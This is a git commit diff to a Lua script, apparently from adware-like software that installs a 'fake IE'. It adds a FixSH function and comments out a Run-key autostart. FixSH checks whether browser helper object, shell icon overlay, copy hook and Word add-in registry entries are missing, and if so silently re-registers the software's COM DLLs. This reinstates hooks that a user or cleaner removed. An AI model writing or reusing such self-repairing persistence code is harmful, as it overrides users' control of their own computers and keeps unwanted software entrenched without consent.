b23e6b21922ef1e7d7d2bdb381175ad641b16571
yuanbaoyule <yuanbaoyule@2e5868d2-258d-7976-05cb-20c09e83d29d>
2015-08-03 11:53:35 +0000

    1.去掉了设置开机启动的代码加入了修复云指令的代码

--- code/IEServerLua/ieextra_v1.1.js
+++ code/IEServerLua/ieextra_v1.1.js
@@ -50,6 +50,40 @@ end
 
 ------------------------------------	
 
+function FixSH()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper")
+	local bRet,strAllUserDir = FunctionObj.QueryAllUsersDir()
+	if not bRet then
+		return false
+	end
+	
+	local strYBHostCfgPath = FunctionObj.tipUtil:PathCombine(strAllUserDir,"iefhost\\config.ini")
+	local strOffice, bRet = FunctionObj.tipUtil:ReadINI(strYBHostCfgPath, "addin", "progid")
+	local strExplorer, bRet = FunctionObj.tipUtil:ReadINI(strYBHostCfgPath, "explorer", "clsid")
+	if not IsRealString(strOffice) or  not IsRealString(strExplorer)then
+		return
+	end
+	
+	local strExplorerDll = tipUtil:PathCombine(strAllUserDir,"iefhost\\exploreicon.dll")
+	if FunctionObj.tipUtil:QueryFileExists(strExplorerDll) then
+		local regIconOverlay = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\ DeskUpdateRemind\\"
+		local regCopyHook = "HKEY_CLASSES_ROOT\\Directory\\shellex\\CopyHookHandlers\\AYBSharing\\"
+		local regBHO = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects\\" .. strExplorer .. "\\"
+		if IsNilString(FunctionObj.RegQueryValue(regIconOverlay))
+			or IsNilString(FunctionObj.RegQueryValue(regCopyHook))
+			or IsNilString(FunctionObj.RegQueryValue(regBHO)) then
+			 FunctionObj.tipUtil:RegisterCOM(strExplorerDll)	
+		end
+	end
+	local strOfficeDll = tipUtil:PathCombine(strAllUserDir,"iefhost\\iefofplugin.dll")
+	if FunctionObj.tipUtil:QueryFileExists(strOfficeDll) then
+		local regOffice = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Office\\Word\\Addins\\" .. strOffice .. "\\CommandLineSafe"
+		if IsNilString(FunctionObj.RegQueryValue(regOffice)) then
+			FunctionObj.tipUtil:RegisterCOM(strOfficeDll)	
+		end
+	end
+end
+
 function main()
 	if type(FunctionObj) ~= "table" then
 		return
@@ -61,13 +95,14 @@ function main()
 	if bHideFakeIE then
 		return
 	end
+	--[[
 	local runReg = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\iexplorer"
 	local runCmd = FunctionObj.RegQueryValue(runReg)
 	if IsRealString(runCmd) then
 		return
 	end
-	
-	SetFakeIESysBoot()
+	--]]
+	FixSH()
 end
 
 main()
